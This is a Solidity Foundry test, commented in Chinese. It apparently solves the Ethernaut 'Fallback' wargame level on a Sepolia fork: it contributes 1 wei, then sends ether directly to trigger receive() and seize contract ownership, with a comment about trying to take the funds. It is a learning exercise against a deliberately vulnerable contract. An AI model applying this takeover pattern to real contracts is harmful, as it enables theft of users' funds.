pragma solidity ^0.8.19;

import "../lib/forge-std/src/Test.sol";

// --- 关卡的接口定义 ---
interface IFallback {
    function contribute() external payable;
    function owner() external view returns (address);
    function contributions(address) external view returns (uint256);
    // 我们知道它有一个 fallback 函数，但接口里可以不写
    function withdraw() external; //加一个这个，我试试能不能抢钱👍
}

contract FallbackTest is Test {
    // --- 状态变量 ---
    IFallback private level = IFallback(0x9b0f6cf2BC2e92175849bD7c6944cDC5Ee0e613f);
    address payable private player = payable(address(this)); // 我们的攻击合约地址

    function setUp() public {
        // 让本地测试环境拥有和真实测试网一模一样的状态
        vm.createSelectFork("sepolia");
    }

    function test_FallbackExploit() public {
        console.log(unicode"一开始我的余额:", player.balance);

        // --- 核心攻击流程 ---
        // 1. 贡献，成为贡献者
        level.contribute{value: 1 wei}();

        // 2. 触发 receive()，夺取 owner
        (bool ok,) = payable(address(level)).call{value: 1 wei}("");
        require(ok, unicode"Second transfer failed");

        // --- 验证核心目标：夺权成功 ---
        assertEq(level.owner(), player, "Failed to claim ownership");

        // --- 庆祝胜利！ ---
        console.log(unicode"夺权成功！新 owner 是:", level.owner());
        console.log(unicode"此时我的余额是:", player.balance);
    }
}
